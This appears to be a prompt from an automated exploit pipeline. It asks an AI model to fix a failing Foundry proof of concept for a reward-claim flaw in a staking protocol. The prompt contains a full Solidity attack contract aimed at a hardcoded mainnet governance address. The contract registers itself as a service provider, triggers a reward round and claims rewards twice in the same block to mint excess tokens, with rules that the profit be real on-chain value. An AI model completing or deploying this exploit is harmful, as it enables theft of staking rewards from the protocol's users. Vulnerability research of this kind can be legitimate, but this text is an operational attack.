You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Funding-block claims can be replayed and reorder payouts because the round snapshot is mutable within the same block
- claim: `initiateRound()` snapshots the round at `block.number`, but `processClaim()` still accepts a claim when `lastClaimedFor == currentRound.fundedBlock`. Reward staking then writes new checkpoints at that same block, and the checkpoint lookup returns the latest value for an equal block number. This makes the supposed funding-block snapshot mutable during the funded block, so same-block replays and intra-block claim ordering change later reward calculations.
- impact: A service provider can bundle `initiateRound()` with multiple same-block `claimRewards()` calls and mint more rewards than intended for that round because `currentRound.totalClaimedInRound` is tracked but never capped. Even without duplicate self-claims, any claims mined earlier in the funded block rewrite the balances later claims read, creating MEV-sensitive overpayment for early claimers and underpayment for later ones.
- exploit_paths: ["Bundle `initiateRound()` and `claimRewards(sp)` twice in the same block; the second call still passes because equality with `fundedBlock` is allowed.", "Mine multiple service-provider claims in the funding block so earlier claims rewrite `totalStakedAt(fundedBlock)` and per-provider stake at that same block before later claims execute."]

Current FlawVerifier.sol:
```solidity
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IGovernanceRoot {
    function getServiceProviderFactoryAddress() external view returns (address);
    function getDelegateManagerAddress() external view returns (address);
    function getStakingAddress() external view returns (address);
}

interface IClaimsManager {
    function initiateRound() external;
    function getLastFundedBlock() external view returns (uint256);
    function getFundsPerRound() external view returns (uint256);
    function claimPending(address serviceProvider) external view returns (bool);
}

interface IDelegateManager {
    function claimRewards(address serviceProvider) external;
    function getClaimsManagerAddress() external view returns (address);
    function getTotalLockedDelegationForServiceProvider(address serviceProvider) external view returns (uint256);
}

interface IStaking {
    function token() external view returns (address);
    function totalStakedFor(address account) external view returns (uint256);
    function totalStakedForAt(address account, uint256 blockNumber) external view returns (uint256);
    function totalStakedAt(uint256 blockNumber) external view returns (uint256);
    function lastClaimedFor(address account) external view returns (uint256);
}

interface IServiceProviderFactory {
    function getServiceTypeManagerAddress() external view returns (address);
    function getServiceProviderDetails(address serviceProvider)
        external
        view
        returns (
            uint256 deployerStake,
            uint256 deployerCut,
            bool validBounds,
            uint256 numberOfEndpoints,
            uint256 minAccountStake,
            uint256 maxAccountStake
        );
    function register(bytes32 serviceType, string calldata endpoint, uint256 stakeAmount, address delegateOwnerWallet)
        external
        returns (uint256);
    function getTotalServiceTypeProviders(bytes32 serviceType) external view returns (uint256);
    function getServiceEndpointInfo(bytes32 serviceType, uint256 serviceId)
        external
        view
        returns (address owner, string memory endpoint, uint256 blockNumber, address delegateOwnerWallet);
    function getPendingDecreaseStakeRequest(address serviceProvider)
        external
        view
        returns (uint256 amount, uint256 lockupExpiryBlock);
}

interface IServiceTypeManager {
    function getValidServiceTypes() external view returns (bytes32[] memory);
    function getServiceTypeInfo(bytes32 serviceType)
        external
        view
        returns (bool isValid, uint256 minStake, uint256 maxStake);
}

contract FlawVerifier {
    address public constant TARGET = 0x4DEcA517D6817B6510798b7328F2314d3003AbAC;

    address private _profitToken;
    uint256 private _profitAmount;

    bool public duplicatePathValidated;
    bool public orderingPathValidated;
    bool public directSelfPathAttempted;
    bool public directSelfPathFeasible;
    bool public usedExistingRoundFunding;
    bool public usedExistingProviderFallback;

    address public primaryProvider;
    address public secondaryProvider;

    uint256 public fundedBlock;
    uint256 public fundingAmount;

    uint256 public initialEconomicBalance;
    uint256 public finalEconomicBalance;

    uint256 public snapshotTotalBefore;
    uint256 public snapshotTotalAfterFirst;
    uint256 public snapshotTotalAfterSecond;

    uint256 public primaryStakeAtBefore;
    uint256 public primaryStakeAtAfterFirst;
    uint256 public primaryStakeAtAfterSecond;

    uint256 public firstClaimIncrease;
    uint256 public secondClaimIncrease;

    uint256 public secondaryExpectedBefore;
    uint256 public secondaryExpectedAfter;
    uint256 public secondaryActualIncrease;

    bytes32 public failure;
    bytes32 public orderingFailure;

    constructor() {}

    function executeOnOpportunity() external {
        _reset();

        IGovernanceRoot root = IGovernanceRoot(TARGET);
        address delegateManagerAddr = root.getDelegateManagerAddress();
        address stakingAddr = root.getStakingAddress();
        address spFactoryAddr = root.getServiceProviderFactoryAddress();
        if (delegateManagerAddr == address(0)) {
            failure = keccak256(bytes("DELEGATE_MANAGER_UNSET"));
            return;
        }
        if (stakingAddr == address(0)) {
            failure = keccak256(bytes("STAKING_UNSET"));
            return;
        }
        if (spFactoryAddr == address(0)) {
            failure = keccak256(bytes("SP_FACTORY_UNSET"));
            return;
        }

        IDelegateManager delegateManager = IDelegateManager(delegateManagerAddr);
        IStaking staking = IStaking(stakingAddr);
        IServiceProviderFactory spFactory = IServiceProviderFactory(spFactoryAddr);

        address claimsManagerAddr = delegateManager.getClaimsManagerAddress();
        if (claimsManagerAddr == address(0)) {
            failure = keccak256(bytes("CLAIMS_MANAGER_UNSET"));
            return;
        }
        IClaimsManager claimsManager = IClaimsManager(claimsManagerAddr);

        _profitToken = _safeTokenAddress(stakingAddr);
        uint256 initialLiquidBalance = _safeBalanceOf(_profitToken, address(this));

        directSelfPathAttempted = true;
        directSelfPathFeasible = _ensureSelfServiceProviderEligibility(spFactory, stakingAddr, _profitToken, address(this));

        try claimsManager.initiateRound() {
            fundedBlock = _safeLastFundedBlock(claimsManagerAddr);
        } catch {
            fundedBlock = _safeLastFundedBlock(claimsManagerAddr);
            usedExistingRoundFunding = fundedBlock == block.number;
        }

        if (fundedBlock != block.number) {
            failure = keccak256(bytes("ROUND_NOT_FUNDED_THIS_BLOCK"));
            _finalize(stakingAddr, initialLiquidBalance);
            return;
        }

        fundingAmount = _safeFundsPerRound(claimsManagerAddr);
        if (fundingAmount == 0) {
            failure = keccak256(bytes("ZERO_FUNDING_AMOUNT"));
            _finalize(stakingAddr, initialLiquidBalance);
            return;
        }

        _selectProviders(spFactory, stakingAddr, delegateManagerAddr, claimsManagerAddr);
        if (primaryProvider == address(0)) {
            failure = keccak256(bytes("NO_PRIMARY_PROVIDER"));
            _finalize(stakingAddr, initialLiquidBalance);
            return;
        }

        if (primaryProvider == address(this)) {
            initialEconomicBalance = initialLiquidBalance + _safeTotalStakedFor(stakingAddr, address(this));
        }

        if (!_runDuplicateClaimPath(delegateManager, staking, primaryProvider)) {
            if (failure == bytes32(0)) {
                failure = keccak256(bytes("DUPLICATE_PATH_FAILED"));
            }
            _finalize(stakingAddr, initialLiquidBalance);
            return;
        }

        _runOrderingPath(delegateManager, stakingAddr, secondaryProvider);
        _finalize(stakingAddr, initialLiquidBalance);
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _selectProviders(
        IServiceProviderFactory spFactory,
        address stakingAddr,
        address delegateManagerAddr,
        address claimsManagerAddr
    ) internal {
        address pendingPrimary;
        address pendingSecondary;
        address alreadyClaimedPrimary;

        if (directSelfPathFeasible) {
            primaryProvider = address(this);
            pendingSecondary = _findPendingProviderExcluding(
                spFactory,
                stakingAddr,
                delegateManagerAddr,
                claimsManagerAddr,
                address(this),
                address(0)
            );
            secondaryProvider = pendingSecondary;
            return;
        }

        usedExistingProviderFallback = true;
        (pendingPrimary, pendingSecondary, alreadyClaimedPrimary) = _findProviderSet(
            spFactory,
            stakingAddr,
            delegateManagerAddr,
            claimsManagerAddr
        );

        if (pendingPrimary != address(0)) {
            primaryProvider = pendingPrimary;
            secondaryProvider = pendingSecondary;
            return;
        }

        primaryProvider = alreadyClaimedPrimary;
        secondaryProvider = pendingSecondary;
    }

    function _runDuplicateClaimPath(
        IDelegateManager delegateManager,
        IStaking staking,
        address serviceProvider
    ) internal returns (bool) {
        uint256 priorLastClaimBlock = _safeLastClaimedFor(address(staking), serviceProvider);
        if (priorLastClaimBlock > fundedBlock) {
            failure = keccak256(bytes("PRIMARY_ALREADY_CLAIMED_LATER"));
            return false;
        }

        snapshotTotalBefore = _safeTotalStakedAt(address(staking), fundedBlock);
        primaryStakeAtBefore = _safeTotalStakedForAt(address(staking), serviceProvider, fundedBlock);
        uint256 balanceBefore = _safeTotalStakedFor(address(staking), serviceProvider);

        try delegateManager.claimRewards(serviceProvider) {
        } catch {
            failure = keccak256(bytes("FIRST_CLAIM_REVERTED"));
            return false;
        }

        uint256 balanceAfterFirst = _safeTotalStakedFor(address(staking), serviceProvider);
        firstClaimIncrease = _positiveDelta(balanceAfterFirst, balanceBefore);
        snapshotTotalAfterFirst = _safeTotalStakedAt(address(staking), fundedBlock);
        primaryStakeAtAfterFirst = _safeTotalStakedForAt(address(staking), serviceProvider, fundedBlock);
        uint256 lastClaimAfterFirst = _safeLastClaimedFor(address(staking), serviceProvider);

        if (
            firstClaimIncrease == 0 ||
            lastClaimAfterFirst != fundedBlock ||
            snapshotTotalAfterFirst <= snapshotTotalBefore ||
            primaryStakeAtAfterFirst <= primaryStakeAtBefore
        ) {
            failure = keccak256(bytes("FIRST_CLAIM_NO_MUTABLE_SNAPSHOT"));
            return false;
        }

        try delegateManager.claimRewards(serviceProvider) {
        } catch {
            failure = keccak256(bytes("SECOND_CLAIM_REVERTED"));
            return false;
        }

        uint256 balanceAfterSecond = _safeTotalStakedFor(address(staking), serviceProvider);
        secondClaimIncrease = _positiveDelta(balanceAfterSecond, balanceAfterFirst);
        snapshotTotalAfterSecond = _safeTotalStakedAt(address(staking), fundedBlock);
        primaryStakeAtAfterSecond = _safeTotalStakedForAt(address(staking), serviceProvider, fundedBlock);
        uint256 lastClaimAfterSecond = _safeLastClaimedFor(address(staking), serviceProvider);

        duplicatePathValidated =
            secondClaimIncrease > 0 &&
            lastClaimAfterSecond == fundedBlock &&
            snapshotTotalAfterSecond > snapshotTotalAfterFirst &&
            primaryStakeAtAfterSecond > primaryStakeAtAfterFirst;

        return duplicatePathValidated;
    }

    function _runOrderingPath(
        IDelegateManager delegateManager,
        address stakingAddr,
        address serviceProvider
    ) internal {
        if (serviceProvider == address(0)) {
            /*
             * No second pending provider was discoverable at execution time, so the later-claimer
             * path cannot be exercised on this fork state without changing the exploit route.
             */
            orderingFailure = keccak256(bytes("NO_SECOND_PENDING_PROVIDER"));
            return;
        }

        if (_safeLastClaimedFor(stakingAddr, serviceProvider) >= fundedBlock) {
            /*
             * The provider is no longer pending in the funded block, so there is no mechanically-valid
             * later claim left to demonstrate the cross-provider ordering effect.
             */
            orderingFailure = keccak256(bytes("SECOND_PROVIDER_NOT_PENDING"));
            return;
        }

        uint256 secondaryActiveStake = _activeStakeAt(serviceProvider, stakingAddr, _delegateManagerFromRoot());
        if (secondaryActiveStake == 0) {
            orderingFailure = keccak256(bytes("SECOND_PROVIDER_ZERO_ACTIVE_STAKE"));
            return;
        }

        secondaryExpectedBefore = (secondaryActiveStake * fundingAmount) / snapshotTotalBefore;
        secondaryExpectedAfter = (secondaryActiveStake * fundingAmount) / snapshotTotalAfterSecond;
        if (secondaryExpectedBefore <= secondaryExpectedAfter) {
            orderingFailure = keccak256(bytes("ORDERING_DELTA_NOT_NEGATIVE"));
            return;
        }

        uint256 balanceBefore = _safeTotalStakedFor(stakingAddr, serviceProvider);
        try delegateManager.claimRewards(serviceProvider) {
        } catch {
            orderingFailure = keccak256(bytes("SECOND_PROVIDER_CLAIM_REVERTED"));
            return;
        }

        secondaryActualIncrease = _positiveDelta(_safeTotalStakedFor(stakingAddr, serviceProvider), balanceBefore);
        orderingPathValidated = secondaryActualIncrease > 0 && secondaryActualIncrease == secondaryExpectedAfter;
        if (!orderingPathValidated && orderingFailure == bytes32(0)) {
            orderingFailure = keccak256(bytes("SECOND_PROVIDER_REWARD_MISMATCH"));
        }
    }

    function _findProviderSet(
        IServiceProviderFactory spFactory,
        address stakingAddr,
        address delegateManagerAddr,
        address claimsManagerAddr
    ) internal view returns (address pendingPrimary, address pendingSecondary, address alreadyClaimedPrimary) {
        address serviceTypeManagerAddr;
        try spFactory.getServiceTypeManagerAddress() returns (address found) {
            serviceTypeManagerAddr = found;
        } catch {
            return (address(0), address(0), address(0));
        }
        if (serviceTypeManagerAddr == address(0)) {
            return (address(0), address(0), address(0));
        }

        bytes32[] memory serviceTypes;
        try IServiceTypeManager(serviceTypeManagerAddr).getValidServiceTypes() returns (bytes32[] memory foundTypes) {
            serviceTypes = foundTypes;
        } catch {
            return (address(0), address(0), address(0));
        }

        for (uint256 typeIndex = 0; typeIndex < serviceTypes.length; typeIndex++) {
            uint256 totalProviders;
            try spFactory.getTotalServiceTypeProviders(serviceTypes[typeIndex]) returns (uint256 foundTotal) {
                totalProviders = foundTotal;
            } catch {
                continue;
            }

            for (uint256 serviceId = 1; serviceId <= totalProviders; serviceId++) {
                address owner;
                try spFactory.getServiceEndpointInfo(serviceTypes[typeIndex], serviceId) returns (
                    address foundOwner,
                    string memory ignoredEndpoint,
                    uint256 ignoredBlockNumber,
                    address ignoredDelegateOwner
                ) {
                    ignoredEndpoint;
                    ignoredBlockNumber;
                    ignoredDelegateOwner;
                    owner = foundOwner;
                } catch {
                    continue;
                }

                if (owner == address(0) || owner == address(this)) {
                    continue;
                }
                if (!_isClaimCandidate(owner, spFactory, stakingAddr, delegateManagerAddr)) {
                    continue;
                }

                uint256 lastClaimed = _safeLastClaimedFor(stakingAddr, owner);
                bool pending;
                try IClaimsManager(claimsManagerAddr).claimPending(owner) returns (bool isPending) {
                    pending = isPending;
                } catch {
                    pending = lastClaimed < fundedBlock;
                }

                if (pending || lastClaimed < fundedBlock) {
                    if (pendingPrimary == address(0)) {
                        pendingPrimary = owner;
                    } else if (owner != pendingPrimary && pendingSecondary == address(0)) {
                        pendingSecondary = owner;
                    }
                } else if (lastClaimed == fundedBlock && alreadyClaimedPrimary == address(0)) {
                    alreadyClaimedPrimary = owner;
                }

                if (
                    pendingPrimary != address(0) &&
                    pendingSecondary != address(0) &&
                    alreadyClaimedPrimary != address(0)
                ) {
                    return (pendingPrimary, pendingSecondary, alreadyClaimedPrimary);
                }
            }
        }
    }

    function _findPendingProviderExcluding(
        IServiceProviderFactory spFactory,
        address stakingAddr,
        address delegateManagerAddr,
        address claimsManagerAddr,
        address excludeA,
        address excludeB
    ) internal view returns (address foundProvider) {
        (address pendingPrimary, address pendingSecondary,) = _findProviderSet(
            spFactory,
            stakingAddr,
            delegateManagerAddr,
            claimsManagerAddr
        );
        if (pendingPrimary != excludeA && pendingPrimary != excludeB) {
            return pendingPrimary;
        }
        if (pendingSecondary != excludeA && pendingSecondary != excludeB) {
            return pendingSecondary;
        }
    }

    function _isClaimCandidate(
        address serviceProvider,
        IServiceProviderFactory spFactory,
        address stakingAddr,
        address delegateManagerAddr
    ) internal view returns (bool) {
        (bool ok, bool validBounds, uint256 endpoints) = _safeServiceProviderStatus(address(spFactory), serviceProvider);
        if (!ok || !validBounds || endpoints == 0) {
            return false;
        }
        return _activeStakeAt(serviceProvider, stakingAddr, delegateManagerAddr) > 0;
    }

    function _activeStakeAt(address serviceProvider, address stakingAddr, address delegateManagerAddr)
        internal
        view
        returns (uint256)
    {
        uint256 stakedAtFundBlock = _safeTotalStakedForAt(stakingAddr, serviceProvider, fundedBlock);
        uint256 lockedDelegation = _safeLockedDelegation(delegateManagerAddr, serviceProvider);
        uint256 pendingDecrease = _safePendingDecrease(_spFactoryFromRoot(), serviceProvider);
        uint256 totalLocked = lockedDelegation + pendingDecrease;
        return stakedAtFundBlock > totalLocked ? stakedAtFundBlock - totalLocked : 0;
    }

    function _ensureSelfServiceProviderEligibility(
        IServiceProviderFactory spFactory,
        address stakingAddr,
        address tokenAddr,
        address serviceProvider
    ) internal returns (bool) {
        (bool detailsOk, bool validBounds, uint256 endpoints) = _safeServiceProviderStatus(address(spFactory), serviceProvider);
        if (detailsOk && endpoints > 0 && validBounds) {
            return true;
        }

        address serviceTypeManagerAddr;
        try spFactory.getServiceTypeManagerAddress() returns (address found) {
            serviceTypeManagerAddr = found;
        } catch {
            return false;
        }
        if (serviceTypeManagerAddr == address(0)) {
            return false;
        }

        bytes32[] memory serviceTypes;
        try IServiceTypeManager(serviceTypeManagerAddr).getValidServiceTypes() returns (bytes32[] memory foundTypes) {
            serviceTypes = foundTypes;
        } catch {
            return false;
        }
        if (serviceTypes.length == 0) {
            return false;
        }

        (bytes32 chosenType, uint256 minStake) = _selectCheapestServiceType(serviceTypeManagerAddr, serviceTypes);
        if (minStake == 0) {
            return false;
        }

        /*
         * Direct attacker ownership is only feasible if the verifier already holds enough AUDIO.
         * This PoC intentionally avoids temporary external capital here because rewards are auto-staked
         * and cannot be withdrawn atomically to repay such funding without changing the exploit route.
         */
        if (_safeBalanceOf(tokenAddr, serviceProvider) < minStake) {
            return false;
        }

        if (!_safeApprove(tokenAddr, stakingAddr, minStake)) {
            return false;
        }

        try spFactory.register(chosenType, _endpoint(serviceProvider), minStake, address(0)) returns (uint256 registeredId) {
            registeredId;
            (bool registeredOk, bool validBoundsAfter, uint256 endpointsAfter) =
                _safeServiceProviderStatus(address(spFactory), serviceProvider);
            return registeredOk && validBoundsAfter && endpointsAfter > 0;
        } catch {
            return false;
        }
    }

    function _selectCheapestServiceType(address serviceTypeManagerAddr, bytes32[] memory serviceTypes)
        internal
        view
        returns (bytes32 chosenType, uint256 minStake)
    {
        minStake = type(uint256).max;
        for (uint256 i = 0; i < serviceTypes.length; i++) {
            try IServiceTypeManager(serviceTypeManagerAddr).getServiceTypeInfo(serviceTypes[i]) returns (
                bool isValid,
                uint256 candidateMinStake,
                uint256 ignoredMaxStake
            ) {
                ignoredMaxStake;
                if (isValid && candidateMinStake > 0 && candidateMinStake < minStake) {
                    minStake = candidateMinStake;
                    chosenType = serviceTypes[i];
                }
            } catch {}
        }

        if (minStake == type(uint256).max) {
            minStake = 0;
        }
    }

    function _finalize(address stakingAddr, uint256 initialLiquidBalance) internal {
        if (primaryProvider == address(this)) {
            finalEconomicBalance = _safeBalanceOf(_profitToken, address(this)) + _safeTotalStakedFor(stakingAddr, address(this));
            _profitAmount = _positiveDelta(finalEconomicBalance, initialEconomicBalance);
            return;
        }

        finalEconomicBalance = initialLiquidBalance + _safeTotalStakedFor(stakingAddr, address(this));
        _profitAmount = 0;
    }

    function _safeTokenAddress(address stakingAddr) internal view returns (address tokenAddr) {
        try IStaking(stakingAddr).token() returns (address found) {
            tokenAddr = found;
        } catch {}
    }

    function _safeTotalStakedFor(address stakingAddr, address account) internal view returns (uint256 amount) {
        try IStaking(stakingAddr).totalStakedFor(account) returns (uint256 found) {
            amount = found;
        } catch {}
    }

    function _safeTotalStakedForAt(address stakingAddr, address account, uint256 blockNumber)
        internal
        view
        returns (uint256 amount)
    {
        try IStaking(stakingAddr).totalStakedForAt(account, blockNumber) returns (uint256 found) {
            amount = found;
        } catch {}
    }

    function _safeTotalStakedAt(address stakingAddr, uint256 blockNumber) internal view returns (uint256 amount) {
        try IStaking(stakingAddr).totalStakedAt(blockNumber) returns (uint256 found) {
            amount = found;
        } catch {}
    }

    function _safeLastClaimedFor(address stakingAddr, address account) internal view returns (uint256 amount) {
        try IStaking(stakingAddr).lastClaimedFor(account) returns (uint256 found) {
            amount = found;
        } catch {}
    }

    function _safeLastFundedBlock(address claimsManagerAddr) internal view returns (uint256 amount) {
        try IClaimsManager(claimsManagerAddr).getLastFundedBlock() returns (uint256 found) {
            amount = found;
        } catch {}
    }

    function _safeFundsPerRound(address claimsManagerAddr) internal view returns (uint256 amount) {
        try IClaimsManager(claimsManagerAddr).getFundsPerRound() returns (uint256 found) {
            amount = found;
        } catch {}
    }

    function _delegateManagerFromRoot() internal view returns (address delegateManagerAddr) {
        try IGovernanceRoot(TARGET).getDelegateManagerAddress() returns (address found) {
            delegateManagerAddr = found;
        } catch {}
    }

    function _spFactoryFromRoot() internal view returns (address spFactoryAddr) {
        try IGovernanceRoot(TARGET).getServiceProviderFactoryAddress() returns (address found) {
            spFactoryAddr = found;
        } catch {}
    }

    function _safeLockedDelegation(address delegateManagerAddr, address serviceProvider)
        internal
        view
        returns (uint256 amount)
    {
        try IDelegateManager(delegateManagerAddr).getTotalLockedDelegationForServiceProvider(serviceProvider) returns (
            uint256 found
        ) {
            amount = found;
        } catch {}
    }

    function _safePendingDecrease(address spFactoryAddr, address serviceProvider)
        internal
        view
        returns (uint256 amount)
    {
        try IServiceProviderFactory(spFactoryAddr).getPendingDecreaseStakeRequest(serviceProvider) returns (
            uint256 found,
            uint256 ignoredLockupExpiryBlock
        ) {
            ignoredLockupExpiryBlock;
            amount = found;
        } catch {}
    }

    function _safeServiceProviderStatus(address spFactoryAddr, address serviceProvider)
        internal
        view
        returns (bool ok, bool validBounds, uint256 endpoints)
    {
        try IServiceProviderFactory(spFactoryAddr).getServiceProviderDetails(serviceProvider) returns (
            uint256 ignoredDeployerStake,
            uint256 ignoredDeployerCut,
            bool foundValidBounds,
            uint256 foundEndpoints,
            uint256 ignoredMinStake,
            uint256 ignoredMaxStake
        ) {
            ignoredDeployerStake;
            ignoredDeployerCut;
            ignoredMinStake;
            ignoredMaxStake;
            ok = true;
            validBounds = foundValidBounds;
            endpoints = foundEndpoints;
        } catch {}
    }

    function _safeBalanceOf(address tokenAddr, address account) internal view returns (uint256 amount) {
        if (tokenAddr == address(0)) {
            return 0;
        }
        (bool ok, bytes memory data) = tokenAddr.staticcall(abi.encodeWithSelector(IERC20.balanceOf.selector, account));
        if (ok && data.length >= 32) {
            amount = abi.decode(data, (uint256));
        }
    }

    function _safeApprove(address tokenAddr, address spender, uint256 amount) internal returns (bool) {
        if (tokenAddr == address(0)) {
            return false;
        }
        (bool ok, bytes memory data) = tokenAddr.call(abi.encodeWithSelector(IERC20.approve.selector, spender, amount));
        if (!ok) {
            return false;
        }
        return data.length == 0 || abi.decode(data, (bool));
    }

    function _endpoint(address serviceProvider) internal pure returns (string memory) {
        return string.concat("https://verifier-", _toHexString(serviceProvider), ".invalid");
    }

    function _toHexString(address account) internal pure returns (string memory) {
        return _toHexString(uint256(uint160(account)), 20);
    }

    function _toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
        bytes16 symbols = 0x30313233343536373839616263646566;
        bytes memory buffer = new bytes(2 + length * 2);
        buffer[0] = "0";
        buffer[1] = "x";
        for (uint256 i = 2 + length * 2; i > 2;) {
            unchecked {
                i--;
            }
            buffer[i] = bytes1(symbols[value & 0xf]);
            value >>= 4;
        }
        require(value == 0, "HEX_LENGTH");
        return string(buffer);
    }

    function _positiveDelta(uint256 currentValue, uint256 priorValue) internal pure returns (uint256) {
        return currentValue > priorValue ? currentValue - priorValue : 0;
    }

    function _reset() internal {
        _profitToken = address(0);
        _profitAmount = 0;
        duplicatePathValidated = false;
        orderingPathValidated = false;
        directSelfPathAttempted = false;
        directSelfPathFeasible = false;
        usedExistingRoundFunding = false;
        usedExistingProviderFallback = false;
        primaryProvider = address(0);
        secondaryProvider = address(0);
        fundedBlock = 0;
        fundingAmount = 0;
        initialEconomicBalance = 0;
        finalEconomicBalance = 0;
        snapshotTotalBefore = 0;
        snapshotTotalAfterFirst = 0;
        snapshotTotalAfterSecond = 0;
        primaryStakeAtBefore = 0;
        primaryStakeAtAfterFirst = 0;
        primaryStakeAtAfterSecond = 0;
        firstClaimIncrease = 0;
        secondClaimIncrease = 0;
        secondaryExpectedBefore = 0;
        secondaryExpectedAfter = 0;
        secondaryActualIncrease = 0;
        failure = bytes32(0);
        orderingFailure = bytes32(0);
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code does not cover paths indexes: 1
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
